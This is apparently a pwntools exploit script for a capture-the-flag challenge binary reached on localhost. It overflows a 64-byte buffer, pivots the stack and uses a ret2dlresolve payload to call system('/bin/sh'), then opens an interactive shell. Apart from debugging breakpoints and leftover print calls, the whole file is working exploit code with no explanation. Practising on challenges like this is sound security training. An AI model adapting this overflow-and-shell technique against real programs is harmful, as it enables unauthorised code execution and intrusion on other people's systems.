#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11101 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 11101)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *addFeedback+46
continue


c
b *0x401026
c
b *_dl_runtime_resolve_xsave+133
b *_dl_fixup+73
c
# c
# c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

dlr = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
pivot = 0x404d00
JMPREL = 0x400668

io.sendlineafter(": ","3")
# 0x404e38 - 0x400688 
# 0x404e38 -> 0x0000000000404e00 -> "system"

p = b'A'*64
p += p64(pivot)
p += p64(0x00000000004014fc)# main+8
io.sendlineafter(": ",p)

p = b"A"*64
p += p64(pivot)
p += p64(0x401060) # plt gets
p += p64(0x401020) # PLT stub
p += p64(dlr.reloc_index) 
p = p.ljust(dlr.data_addr - pivot + 64,b"A") # 0x100 + 64
p += dlr.payload

print(dir(dlr))
print(hex(dlr.data_addr))

io.sendline(p)
io.sendline(b"//////bin/sh\x00")

io.interactive()

